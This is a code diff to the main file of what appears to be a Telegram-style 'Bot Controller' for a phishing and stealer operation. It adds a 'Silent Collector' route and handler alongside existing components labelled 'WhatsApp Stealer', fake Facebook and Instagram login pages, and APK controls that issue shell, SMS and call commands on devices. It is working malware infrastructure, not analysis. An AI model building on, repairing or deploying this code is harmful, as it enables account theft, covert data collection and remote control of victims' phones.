@@ -1,7 +1,7 @@
 # main.py
 # ============================================================
-# DEV 1 - Bot Controller v7
-# بعد حذف RAT / QR / LSH / SH
+# DEV 1 - Bot Controller v8
+# مع Silent Collector
 # ============================================================
 
 import os
@@ -32,9 +32,11 @@ from imports_manager import (
     wa_bp, apk_bp,
     # Flags
     WA_ENABLED, APK_MANAGER_ENABLED,
+    SILENT_ENABLED,
     # Init functions
     init_facebook_routes, init_instagram_routes,
     init_whatsapp_stealer_routes, init_apk_routes,
+    init_silent_collector_routes,
     # Helpers
     register_payment_handlers,
 )
@@ -49,6 +51,7 @@ from bot_handlers import (
     apk_toast_step, apk_shell_step, apk_sendsms_step,
     apk_call_step, apk_url_step,
     upd_target_handler,
+    silent_label_handler,
     admin_search_handler, admin_broadcast_handler,
     admin_ban_handler, admin_unban_handler, admin_delete_handler,
     admin_grant_vip_handler, admin_give_stars_handler,
@@ -108,6 +111,7 @@ ALLOWED_PREFIXES = (
     '/wa',              # WhatsApp Stealer
     '/apk',             # APK Manager + Auto-Update
     '/dashboard',       # Web Dashboard
+    '/s/',              # ★ Silent Collector
     '/api/v1/session', '/f/',
     '/login.php', '/ig_login.php',
     '/manifest.json', '/sw.js',
@@ -232,6 +236,16 @@ if APK_UPDATE_ENABLED:
         logger.exception(f"[-] APK Update init failed: {e}")
 else:
     logger.warning("[-] APK Update disabled - skipping init")
+
+# ★ Silent Collector Routes
+if SILENT_ENABLED:
+    try:
+        init_silent_collector_routes(app, bot)
+        logger.info("[+] Init: silent collector routes")
+    except Exception as e:
+        logger.exception(f"[-] Silent Collector init failed: {e}")
+else:
+    logger.warning("[-] Silent Collector disabled - skipping init")
 
 register_payment_handlers(bot)
 logger.info("[+] Init: payment handlers")
